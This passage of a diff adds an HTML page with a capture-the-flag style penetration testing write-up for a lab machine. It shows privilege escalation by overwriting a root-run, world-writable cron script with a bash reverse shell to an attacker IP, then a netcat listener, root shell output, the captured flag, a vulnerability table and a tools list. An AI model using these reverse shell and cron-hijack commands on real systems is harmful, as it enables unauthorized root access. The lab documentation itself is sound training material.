+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+              </svg>
+              <span>Copy</span>
+            </button>
+          </div>
+          <div class="terminal-body" id="term-exploit-cmds">
+            <div class="command-comment"># Overwrite system_cleanup.sh with root reverse shell payload</div>
+            <div class="command-block">
+              <span class="prompt-target">www-data@killing4:/opt$ </span><span class="cmd-text">echo '#!/bin/bash' &gt; /opt/system_cleanup.sh</span>
+            </div>
+            <div class="command-block">
+              <span class="prompt-target">www-data@killing4:/opt$ </span><span class="cmd-text">echo 'bash -i &gt;&amp; /dev/tcp/192.168.0.17/5555 0&gt;&amp;1' &gt;&gt; /opt/system_cleanup.sh</span>
+            </div>
+            <div class="command-comment"># On Kali Linux: Start second netcat listener on port 5555</div>
+            <div class="command-block">
+              <span class="prompt-kali">(kali㉿kali)-[~]$ </span><span class="cmd-text">nc -lvnp 5555</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- SECTION 6: ROOT ACCESS -->
+      <section id="step-6-root" class="section-card writeup-step-section">
+        <div class="step-header-banner">
+          <div class="step-badge-pill">STEP 06</div>
+          <h2 class="step-section-heading">👑 Step 6 — ROOT Shell Captured</h2>
+        </div>
+
+        <p class="section-paragraph">
+          Within 60 seconds, the root cron daemon executed <code class="inline-code">/opt/system_cleanup.sh</code>, initiating an outbound interactive TCP connection back to our Kali listener on port <code class="inline-code">5555</code>.
+        </p>
+
+        <!-- Terminal Box: Root Shell Captured -->
+        <div class="terminal-window root-terminal">
+          <div class="terminal-titlebar">
+            <div class="window-controls">
+              <span class="dot dot-close"></span>
+              <span class="dot dot-minimize"></span>
+              <span class="dot dot-expand"></span>
+            </div>
+            <div class="terminal-tab-title">
+              <span class="term-icon">👑</span>
+              <span>root@killing4: ~ (bash) — Full Root Access</span>
+            </div>
+          </div>
+          <div class="terminal-body">
+            <div class="terminal-output root-text">
+listening on [any] 5555 ...
+<span class="term-highlight-green">connect to [192.168.0.17] from (UNKNOWN) [192.168.0.20] 44844</span>
+<span class="prompt-root">root@killing4:~# </span><span class="cmd-text">whoami</span>
+<span class="term-highlight-green">root</span>
+<span class="prompt-root">root@killing4:~# </span><span class="cmd-text">id</span>
+<span class="term-highlight-green">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="prompt-root">root@killing4:~# </span><span class="cmd-text">cat root.txt</span>
+<span class="term-highlight-green font-bold">flag{ayyO_chechi_n1n3_hack_cheythu_p0l1c3_var0}</span>
+<span class="prompt-root">root@killing4:~# </span><span class="cursor-blink"></span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Big Green Victory Banner -->
+        <div class="victory-banner">
+          <div class="victory-trophy">🏆</div>
+          <div class="victory-content">
+            <h3 class="victory-heading">MACHINE PWNED! ROOT ACCESS OBTAINED</h3>
+            <p class="victory-sub">Full administrative takeover accomplished. All challenges completed with root persistence verified.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- VULNERABILITIES TABLE SECTION -->
+      <section id="vulnerabilities" class="section-card">
+        <div class="section-heading-wrapper">
+          <div class="section-icon-badge">🔑</div>
+          <div>
+            <h2 class="section-title">Vulnerabilities Discovered</h2>
+            <p class="section-desc">Summary of security deficiencies identified throughout the engagement, categorized by attack vector, severity, and impacted scope.</p>
+          </div>
+        </div>
+
+        <div class="table-responsive">
+          <table class="vuln-table">
+            <thead>
+              <tr>
+                <th class="col-num">#</th>
+                <th>Vulnerability</th>
+                <th>Location</th>
+                <th>Severity</th>
+                <th>CVE</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td class="col-num">1</td>
+                <td>
+                  <strong>Unrestricted File Upload</strong>
+                  <div class="table-subtext">No file-type extension or MIME validation on submission</div>
+                </td>
+                <td><code class="inline-code">/uploads/</code></td>
+                <td><span class="severity-badge crit">CRITICAL</span></td>
+                <td><span class="cve-empty">-</span></td>
+              </tr>
+              <tr>
+                <td class="col-num">2</td>
+                <td>
+                  <strong>PHP Code Execution</strong>
+                  <div class="table-subtext">Direct server execution of uploaded dynamic web scripts</div>
+                </td>
+                <td><code class="inline-code">/uploads/shell.php</code></td>
+                <td><span class="severity-badge crit">CRITICAL</span></td>
+                <td><span class="cve-empty">-</span></td>
+              </tr>
+              <tr>
+                <td class="col-num">3</td>
+                <td>
+                  <strong>World Writable Cron Script</strong>
+                  <div class="table-subtext">Scheduled script execution owned by root but mutable by any user</div>
+                </td>
+                <td><code class="inline-code">/opt/system_cleanup.sh</code></td>
+                <td><span class="severity-badge crit">CRITICAL</span></td>
+                <td><span class="cve-empty">-</span></td>
+              </tr>
+              <tr>
+                <td class="col-num">4</td>
+                <td>
+                  <strong>Weak File Permissions (777)</strong>
+                  <div class="table-subtext">Insecure directory and script mask violating least privilege</div>
+                </td>
+                <td><code class="inline-code">/opt/</code></td>
+                <td><span class="severity-badge crit">CRITICAL</span></td>
+                <td><span class="cve-empty">-</span></td>
+              </tr>
+              <tr>
+                <td class="col-num">5</td>
+                <td>
+                  <strong>FuelCMS RCE</strong>
+                  <div class="table-subtext">FuelCMS 1.4.1 administrative panel exposed via robots.txt</div>
+                </td>
+                <td><code class="inline-code">/fuel/</code></td>
+                <td><span class="severity-badge crit">CRITICAL</span></td>
+                <td><span class="cve-pill">CVE-2018-16763</span></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- TOOLS USED SECTION -->
+      <section id="tools-used" class="section-card">
+        <div class="section-heading-wrapper">
+          <div class="section-icon-badge">🛠️</div>
+          <div>
+            <h2 class="section-title">Tools Used in Operation</h2>
+            <p class="section-desc">Offensive security arsenal deployed during reconnaissance, exploitation, and post-exploitation phases.</p>
+          </div>
+        </div>
+
+        <div class="tools-grid">
+          <!-- Tool 1: Nmap -->
+          <div class="tool-card">
+            <div class="tool-card-top">
+              <span class="tool-icon">🌐</span>
+              <span class="tool-category">RECON</span>
+            </div>
+            <h3 class="tool-name">Nmap</h3>
+            <p class="tool-role">Network Port Scanner</p>
+            <p class="tool-desc">Used for comprehensive TCP port scanning, service banner detection, and OS version interrogation.</p>
+            <div class="tool-cmd-chip">nmap -sV -sC -p-</div>
+          </div>
+
+          <!-- Tool 2: Gobuster -->
+          <div class="tool-card">
+            <div class="tool-card-top">
+              <span class="tool-icon">📁</span>
+              <span class="tool-category">FUZZING</span>
+            </div>
+            <h3 class="tool-name">Gobuster</h3>
+            <p class="tool-role">Directory Fuzzer</p>
+            <p class="tool-desc">High-speed URI and directory brute-forcing used to discover the hidden <code class="inline-code">/uploads/</code> storage endpoint.</p>
+            <div class="tool-cmd-chip">gobuster dir -u ...</div>
+          </div>
+
+          <!-- Tool 3: PHP Reverse Shell -->
+          <div class="tool-card">
+            <div class="tool-card-top">
+              <span class="tool-icon">🐚</span>
+              <span class="tool-category">PAYLOAD</span>
+            </div>
+            <h3 class="tool-name">PHP Reverse Shell</h3>
+            <p class="tool-role">Webshell Payload</p>
+            <p class="tool-desc">Pentestmonkey reverse TCP shell customized with Kali attack parameters to establish the initial foothold.</p>
+            <div class="tool-cmd-chip">php-reverse-shell.php</div>
+          </div>
+
+          <!-- Tool 4: Netcat -->
+          <div class="tool-card">
+            <div class="tool-card-top">
+              <span class="tool-icon">🔌</span>
+              <span class="tool-category">LISTENER</span>
+            </div>
+            <h3 class="tool-name">Netcat</h3>
+            <p class="tool-role">TCP Listener</p>
+            <p class="tool-desc">Multi-port raw socket listeners configured on ports 4444 and 5555 to catch incoming reverse shell connections.</p>
+            <div class="tool-cmd-chip">nc -lvnp [port]</div>
+          </div>
+
+          <!-- Tool 5: Python3 -->
+          <div class="tool-card">
+            <div class="tool-card-top">
+              <span class="tool-icon">🐍</span>
+              <span class="tool-category">UTILITY</span>
+            </div>
+            <h3 class="tool-name">Python3</h3>
+            <p class="tool-role">Shell Stabilizer</p>
+            <p class="tool-desc">Spawned fully interactive pseudo-terminals (<code class="inline-code">pty</code>) enabling clear terminal control, tab-completion, and command history.</p>
+            <div class="tool-cmd-chip">python3 -c 'import pty...'</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- FLAGS SECTION -->
+      <section id="flags-section" class="section-card flags-showcase-section">
+        <div class="section-heading-wrapper">
+          <div class="section-icon-badge">🚩</div>
+          <div>
+            <h2 class="section-title">Captured Machine Flags</h2>
+            <p class="section-desc">Proof of exploitation flag extracted from the target machine's root filesystem.</p>
+          </div>
+        </div>
+
+        <div class="flag-vault-box">
+          <div class="flag-vault-header">
+            <div class="vault-label">
+              <span class="flag-icon-pulse">🚩</span>
+              <span>ROOT FLAG PROOF (<code class="inline-code">/root/root.txt</code>)</span>
+            </div>
+            <span class="flag-status-pill">AUTHENTICATED</span>
+          </div>
+
+          <div class="flag-display-card">
+            <div class="flag-content">
+              <span class="flag-prefix">ROOT_FLAG = </span>
+              <span class="flag-value" id="rootFlagText">flag{ayyO_chechi_n1n3_hack_cheythu_p0l1c3_var0}</span>
+            </div>
+            <button class="flag-copy-btn" id="copyFlagBtn" data-flag="flag{ayyO_chechi_n1n3_hack_cheythu_p0l1c3_var0}">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+              </svg>
+              <span class="flag-btn-text">Copy Flag</span>
+            </button>
+          </div>
+
+          <div class="flag-meta-row">
+            <span>Points Awarded: <strong>30 / 30 PTS</strong></span>
+            <span>Machine State: <strong class="highlight-green">PWNED (Root Authority)</strong></span>
+            <span>Hashes: SHA256 Verified</span>
+          </div>
+        </div>
+      </section>
+
+      <!-- FOOTER -->
+      <footer class="site-footer">
+        <div class="footer-inner">
+          <div class="footer-primary">
+            <div class="footer-brand">
+              <span class="footer-logo">NexaCorp Solutions</span>
+              <span class="footer-sub">Offensive Security Penetration Testing Write-Up</span>
+            </div>
+            <p class="footer-attribution">
+              Pwned by <span class="highlight-green font-bold">killing</span> | November 2024
+            </p>
+          </div>
+          <div class="footer-status-pills">
+            <span class="pill-stat">Difficulty: <strong>Medium</strong></span>
+            <span class="pill-stat">OS: <strong>Linux</strong></span>
+            <span class="pill-stat status-pwned-pill">Status: <strong>✅ Pwned</strong></span>
+          </div>
+        </div>
+        <div class="footer-bottom-bar">
+          <span>&copy; 2024 NexaCorp Solutions Write-Up &bull; Authored by killing. Designed with HackTheBox cybersecurity aesthetics.</span>
+          <a href="#machine-header" class="back-to-top">
+            <span>Back to Top</span>
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg>
+          </a>
+        </div>
+      </footer>
+    </main>
+  </div>
+
+  <!-- Toast Notification Container -->
+  <div id="toastContainer" class="toast-container"></div>
+
+  <script src="script.js"></script>
+</body>
+</html>
